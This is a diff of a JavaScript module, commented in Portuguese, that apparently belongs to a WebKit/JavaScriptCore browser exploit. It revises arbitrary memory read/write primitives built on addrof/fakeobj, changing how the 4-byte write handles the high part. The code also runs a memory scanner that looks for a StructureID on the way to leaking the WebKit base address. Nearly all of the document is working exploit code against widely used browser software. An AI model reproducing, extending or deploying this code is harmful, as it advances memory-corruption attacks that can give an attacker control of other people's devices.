@@ -1,11 +1,9 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v113 - R73 Teste de Coerência com JS normal na Fase 5)
+// js/script3/testArrayBufferVictimCrash.mjs (v114 - R74 Correção de Escrita de 4 Bytes)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA:
-// - Adiciona um teste de coerência na Fase 5:
-//   1. Escreve um valor conhecido numa propriedade do leak_target_obj via arb_write_final_func.
-//   2. Tenta ler o MESMO VALOR dessa propriedade usando acesso JavaScript NORMAL (leak_target_obj.f).
-//   3. Compara o valor lido via JS normal com o valor escrito via primitiva.
-// - Isso determinará se a arb_write_final_func está realmente escrevendo no objeto.
+// - Corrigida a lógica de escrita de 4 bytes em arb_write_final_func para não depender
+//   do high part da leitura atual, eliminando o RangeError no construtor AdvancedInt64.
+// - A lógica agora define o high part como 0 para escritas de 4 bytes.
 // =======================================================================================
 
 import { logS3, PAUSE_S3 } from './s3_utils.mjs';
@@ -17,7 +15,7 @@ import {
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
 // Nome do módulo atualizado para refletir a nova tentativa de correção
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v113_R73_CoherenceTest";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v114_R74_Write4ByteFix";
 
 // --- Funções de Conversão (Double <-> Int64) ---
 function int64ToDouble(int64) {
@@ -41,7 +39,7 @@ function doubleToInt64(double) {
 // =======================================================================================
 export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
     const FNAME_CURRENT_TEST_BASE = FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT;
-    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Teste de Coerência na Fase 5 ---`, "test");
+    logS3(`--- Iniciando ${FNAME_CURRENT_TEST_BASE}: Implementação com Correção de Escrita de 4 Bytes ---`, "test");
 
     let final_result = {
         success: false,
@@ -82,9 +80,10 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             arb_write_final_func = (addr, value, size_bytes = 8) => { 
                 leaker.obj_prop = fakeobj_func(addr);
                 if (size_bytes === 4) {
-                    const current_val_64 = doubleToInt64(leaker.val_prop);
-                    const value_64 = new AdvancedInt64(Number(value) & 0xFFFFFFFF, current_val_64.high());
-                    leaker.val_prop = int64ToDouble(value_64);
+                    // CORREÇÃO: Para escrita de 4 bytes, criar AdvancedInt64 com high = 0.
+                    // Isso evita o problema com 'current_val_64.high()' que pode ser NaN/inválido.
+                    const value_to_write_64 = new AdvancedInt64(Number(value) & 0xFFFFFFFF, 0); 
+                    leaker.val_prop = int64ToDouble(value_to_write_64);
                 } else {
                     leaker.val_prop = int64ToDouble(value);
                 }
@@ -176,7 +175,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         logS3(`    (Coerência) Escrevendo 0x${coherence_test_val.toString(16)} em ${prop_f_addr.toString(true)} via arb_write_final_func (4 bytes)...`, "info");
         arb_write_final_func(prop_f_addr, coherence_test_val, 4); // Escreve 4 bytes
 
-        await PAUSE_S3(10); // Pequena pausa para garantir a escrita
+        await PAUSE_S3(10); 
 
         logS3(`    (Coerência) Lendo o valor de leak_target_obj.f via JavaScript normal...`, "info");
         const read_via_js_normal = leak_target_obj.f;
@@ -204,11 +203,9 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
         for (let offset = SCAN_RANGE_START; offset < SCAN_RANGE_END; offset += SCAN_STEP) {
             const current_scan_addr = leak_target_addr.add(offset);
             
-            // Usar as funções principais de leitura/escrita arbitrária.
-            // arb_read_final_func já lida com leaker.obj_prop = fakeobj_func(addr);
-            
             let val_8_bytes = AdvancedInt64.Zero;
             try {
+                // Usar arb_read_final_func diretamente, que já tem a lógica do leaker.
                 val_8_bytes = arb_read_final_func(current_scan_addr, 8); 
                 logS3(`    [Scanner] Offset ${toHex(offset, 6)}: Lido QWORD ${val_8_bytes.toString(true)}`, "debug");
 
@@ -255,10 +252,8 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43() {
             actual_structure_id = found_structure_id;
             logS3(`[DECISÃO] Usando StructureID encontrado pelo scanner em ${toHex(JSC_OFFSETS.JSCell.STRUCTURE_ID_FLATTENED_OFFSET)}: ${toHex(actual_structure_id)}`, "info");
             
-            // Se o StructureID for encontrado, para este teste, vamos apenas logar e considerar um sucesso para o scanner.
-            // A resolução para o WebKit Base Address via Structure Table exigirá mais passos.
             final_result.message = `StructureID ${toHex(actual_structure_id)} encontrado. Precisamos do WebKit Base Address e da Structure Table Base para resolver o ponteiro da Structure.`;
-            final_result.success = true; // Marca como sucesso para o teste do scanner
+            final_result.success = true; 
             final_result.webkit_leak_result = { success: false, msg: final_result.message, webkit_base_candidate: null };
             return final_result; 
 
